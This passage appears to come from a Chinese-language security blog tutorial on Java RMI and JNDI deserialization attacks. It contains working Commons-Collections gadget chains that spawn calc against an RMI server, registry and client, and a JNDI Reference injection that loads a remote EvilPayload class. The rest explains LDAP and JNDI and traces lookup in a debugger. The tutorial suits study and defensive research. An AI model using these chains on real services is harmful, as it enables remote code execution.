class="comment">//获取Runtime类对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">            <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="/posts/ad3be040/r-128.png" title="攻击服务端"></p><h3 id="2、攻击注册中心Registry"><a href="#2、攻击注册中心Registry" class="headerlink" title="2、攻击注册中心Registry"></a>2、攻击注册中心Registry</h3><p>在底层调试分析注册中心处理客户端和服务端请求的时候提到，根据不同的分支进入对应的处理，其中客户端使用的<code>lookup</code>方法参数为字符串，因此不能通过<code>lookup</code>方法传递<code>Object</code>对象攻击注册中心，但服务端&#x2F;客户端可调用<code>bind</code>、<code>rebind</code>等方法绑定对象，将<code>Object</code>对象传入，注册中心再接收到服务端&#x2F;客户端的<code>bind</code>对象进行反序列化读取时，触发漏洞<br>服务端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        <span class="comment">//创建远程调用对象</span></span><br><span class="line">        RMIObject rmo=<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>();</span><br><span class="line">        <span class="comment">//创建注册中心绑定调用端口</span></span><br><span class="line">        Registry rg= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//Registry rg = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span></span><br><span class="line">        <span class="comment">//注册绑定调用服务</span></span><br><span class="line">        rg.bind(<span class="string">&quot;RMIObject&quot;</span>,rmo);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>客户端向注册中心绑定恶意<code>Bind</code>：<br>由于<code>bind</code>对象是需要<code>Remote</code>对象，因此调用的链最后需要将返回的对象添加一个动态代理返回给<code>Remote</code>对象即可，在cc1链上最后返回值加工一下即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//恶意bind，注册中心反序列化解析bind对象时触发漏洞</span></span><br><span class="line">        rg.bind(<span class="string">&quot;payload&quot;</span>,payload());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">payload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">            Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">            <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">            InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">            <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">            Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">            <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">            InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line">            Remote remobj=(Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,invohandlerproxy);</span><br><span class="line">            <span class="keyword">return</span> remobj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：<br><img src="/posts/ad3be040/r-129.png" title="攻击注册中心"></p><h3 id="3、攻击客户端Client"><a href="#3、攻击客户端Client" class="headerlink" title="3、攻击客户端Client"></a>3、攻击客户端Client</h3><p>客户端向注册中心请求会返回<code>stub</code>时，会反序列化解析数据导致漏洞，也可以在服务端放置恶意的方法返回对象，客户端调用服务端的方法时解析放回来的数据时导致漏洞。</p><p>原理相同这里以服务器端放置恶意方法返回给客户端进行解析触发漏洞举例</p><p>服务端：<br>RMIObject:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">helloObj</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException,Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RMIObjectImpl</code>放置恶意方法:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">helloObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>客户端调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RMIObject</span> <span class="variable">rc</span> <span class="operator">=</span> (RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        <span class="comment">//调用服务端恶意方法</span></span><br><span class="line">        rc.helloObj();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行效果：<br><img src="/posts/ad3be040/r-130.png" title="攻击客户端"></p><h1 id="0x02、LDAP"><a href="#0x02、LDAP" class="headerlink" title="0x02、LDAP"></a>0x02、LDAP</h1><p><strong>LDAP描述</strong><br>引用：</p><blockquote><p>LDAP是轻量目录访问协议(LightweightDirectory Access Protocol)，是一种轻型目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。<br>目录是一个为查询、浏览和搜索而优化的数据库，是树状结构组织数据，通过TCP&#x2F;IP传输服务运行。</p></blockquote><p>LDAP作用是类似文件目录，而不是实际的数据库，功能作用比喻就是电话簿、地址簿。</p><p>LDAP服务常见端口：LDAP:389  LDAPS:636</p><p>引用<a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie">文章</a>中的原理图：</p><p><img src="/posts/ad3be040/r-186.png" title="LDAP原理图"></p><p>这里直接引用<a href="https://www.cnblogs.com/wilburxu/p/9174353.html">相关概念</a>，写的很清楚了<br>以及引用概念：<br>目录树：</p><ol><li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。</li><li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。</li><li>对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来。</li><li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。</li></ol><p>DC、UID、OU、CN、SN、DN、RDN相关含义：</p><table><thead><tr><th>关键字</th><th>英文全称</th><th>含义</th></tr></thead><tbody><tr><td>dc</td><td>Domain Component</td><td>域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc&#x3D;example,dc&#x3D;com（一条记录的所属位置）</td></tr><tr><td>uid</td><td>User Id</td><td>用户ID songtao.xu（一条记录的ID）</td></tr><tr><td>ou</td><td>Organization Unit</td><td>组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如“oa组”（一条记录的所属组织）</td></tr><tr><td>cn</td><td>Common Name</td><td>公共名称，如“Thomas Johansson”（一条记录的名称）</td></tr><tr><td>sn</td><td>Surname</td><td>姓，如“许”</td></tr><tr><td>dn</td><td>Distinguished Name</td><td>“uid&#x3D;songtao.xu,ou&#x3D;oa组,dc&#x3D;example,dc&#x3D;com”，一条记录的位置（唯一）</td></tr><tr><td>rdn</td><td>Relative dn</td><td>相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid&#x3D;tom”或“cn&#x3D; Thomas Johansson”</td></tr></tbody></table><h1 id="0x03、JNDI"><a href="#0x03、JNDI" class="headerlink" title="0x03、JNDI"></a>0x03、JNDI</h1><h2 id="一、JNDI描述"><a href="#一、JNDI描述" class="headerlink" title="一、JNDI描述"></a>一、JNDI描述</h2><p>JNDI(Java Naming and Directory Interface)，命名和目录接口。</p><p>引用描述：</p><blockquote><p>JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p><p>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p></blockquote><p>功能描述和框架：</p><p><img src="/posts/ad3be040/r-139.png" title="JNDI"><br><img src="/posts/ad3be040/r-140.png" title="JNDI"></p><p>实现效果就是通过一个字符串来绑定对象如（rmi、ldap、CORBA、dns等等），把这些服务当作容器，通过JNDI封装一下来调用这些容器，充当一个API的作用</p><h2 id="二、简单实现"><a href="#二、简单实现" class="headerlink" title="二、简单实现"></a>二、简单实现</h2><h3 id="1、jndi-rmi原生调用"><a href="#1、jndi-rmi原生调用" class="headerlink" title="1、jndi-rmi原生调用"></a>1、jndi-rmi原生调用</h3><p>原生调用方式跟RMI差不多，相当于在RMI上套了一层壳去调用，相关漏洞也跟RMI漏洞一样</p><p>JNDI本身不区分客户端和服务端，由于绑定对象在服务端，因此在服务端进行的绑定JNDI，JNDIClient在服务端和客户端均可。<br>JNDIServer:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-141.png" title="JNDIServer"></p><p>JNDIClient:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-142.png" title="JNDIClient"></p><h3 id="2、References-rmi注入-核心"><a href="#2、References-rmi注入-核心" class="headerlink" title="2、References-rmi注入(核心)"></a>2、References-rmi注入(核心)</h3><p>引用核心部分说明：</p><blockquote><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p></blockquote><p>以及利用流程：</p><ul><li>1.目标代码中调用了 InitialContext.lookup(URI)，且 URI 为用户可控；</li><li>2.攻击者控制 URI 参数为恶意的 RMI 服务地址，如：rmi:&#x2F;&#x2F;hacker_rmi_server&#x2F;&#x2F;name；</li><li>3.攻击者 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定某个精心构造的 Factory 类；</li><li>4.目标在进行 lookup()操作时，会动态加载并实例化 Factory 类，接着调用 factory.getObjectInstance()获取外部远程对象实例；</li><li>5.攻击者可以在 Factory 类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到 RCE 的效果；</li></ul><p>简述就是可以通过References引用远程用户自定义地址的factory工厂执行恶意代码。</p><p>实现:<br>JNDIServer端（通过References绑定远程地址和工厂）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        ic.rebind(&quot;rmi://localhost:1099/RMIObject&quot;,new RMIObjectImpl());</span></span><br><span class="line">        Reference rf=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;EvilPayload&quot;</span>,<span class="string">&quot;http://localhost:8999/&quot;</span>);</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,rf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>恶意远程地址：<br><img src="/posts/ad3be040/r-143.png" title="恶意远程地址"></p><p>恶意类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端执行:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-144.png" title="客户端执行"></p><h3 id="3、References-ldap注入-核心"><a href="#3、References-ldap注入-核心" class="headerlink" title="3、References-ldap注入(核心)"></a>3、References-ldap注入(核心)</h3><p>利用流程很简单：通过客户端lookup查询远程ldap服务恶意类触发漏洞。</p><p>恶意地址类:</p><p><img src="/posts/ad3be040/r-188.png" title="恶意地址类"></p><p>客户端启动ldap服务，将恶意地址类进行绑定：</p><p><img src="/posts/ad3be040/r-187.png" title="LDAP服务"></p><p>客户端进行查询ldap服务，触发漏洞：</p><p><img src="/posts/ad3be040/r-189.png" title="lookup查询"></p><h2 id="三、源码分析"><a href="#三、源码分析" class="headerlink" title="三、源码分析"></a>三、源码分析</h2><h3 id="1、jndi-rmi原生调用分析"><a href="#1、jndi-rmi原生调用分析" class="headerlink" title="1、jndi-rmi原生调用分析"></a>1、jndi-rmi原生调用分析</h3><p>这里其实流程不多的，前面提到了该调用方式，顺带学习下流程分析<br>JNDI-RMI服务端:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">    InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>JNDI-RMI客户端调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在调用<code>lookup</code>处下断点</p><p><img src="/posts/ad3be040/r-149.png" title="lookup方法"></p><p>跟进<code>InitialContext.lookup</code>方法</p><p><img src="/posts/ad3be040/r-150.png" title="lookup方法"></p><p>通过<code>getURLOrDefaultInitCtx</code>方法获取字符串上下文，传递的为rmi路径字符串，判断字符串协议，获取到<code>rmiURLContext</code>上下文表（实际是一个<code>hashtable</code>）</p><p><img src="/posts/ad3be040/r-151.png" title="rmiURLContext"></p><p>返回<code>rmiURLContext</code>上下文表后调用，<code>rmiURLContext.lookup</code>方法，实际调用<code>rmiURLContext</code>父类<code>GenericURLContext</code>的<code>lookup</code>方法，继续跟进<code>GenericURLContext.lookup</code>方法</p><p>通过<code>getRootURLContext</code>方法对<code>name</code>字符串进行分割读取</p><p><img src="/posts/ad3be040/r-152.png" title="rmiURLContext"></p><p>分割完后通过<code>RegistryContext</code>方法获取注册信息</p><p><img src="/posts/ad3be040/r-153.png" title="RegistryContext"></p><p>通过<code>getRegistry</code>方法获取到<code>RegistryImpl_Stub</code>的注册信息</p><p><img src="/posts/ad3be040/r-154.png" title="getRegistry"></p><p>调用注册中心获取注册中心<code>stub</code></p><p><img src="/posts/ad3be040/r-155.png" title="getRegistry"></p><p>获取到过后回到主体，通过<code>ResolveResult</code>方法解析结果</p><p><img src="/posts/ad3be040/r-156.png" title="ResolveResult"></p><p>实际就是将注册内容赋值给解析结果</p><p><img src="/posts/ad3be040/r-157.png" title="ResolveResult"></p><p>获取到解析结果<code>res</code>,再调用<code>getResolvedObj</code>方法获取到解析结果对象（也就是<code>RegistryContext</code>）</p><p><img src="/posts/ad3be040/r-158.png" title="res"></p><p>再调用<code>RegistryContext.lookup</code>方法</p><p><img src="/posts/ad3be040/r-159.png" title="RegistryContext.lookup"></p><p>这里就是调用原生rmi的步骤了</p><p><img src="/posts/ad3be040/r-160.png" title="RegistryImpl_stub"></p><p>调用<code>RegistryImpl_stub.lookup</code>方法，流程跟上面分析过的<code>rmi</code>的步骤一样通过<code>lookup</code>向注册中心查询远程对象，就不再分析了</p><p><img src="/posts/ad3be040/r-161.png" title="RegistryImpl_stub"></p><p>返回了一个远程服务器的动态代理对象<code>stub</code></p><p><img src="/posts/ad3be040/r-163.png" title="stub"></p><p>然后调用<code>decodeObject</code>方法</p><p><img src="/posts/ad3be040/r-164.png" title="decodeObject"></p><p><code>decodeObject</code>方法最先判断该远程对象（<code>RemoteObjectlnvocationHandler</code>）是否属于<code>RemoteReference</code>远程引用类，由于不属于就将该对象转化为<code>Object</code>对象</p><p><img 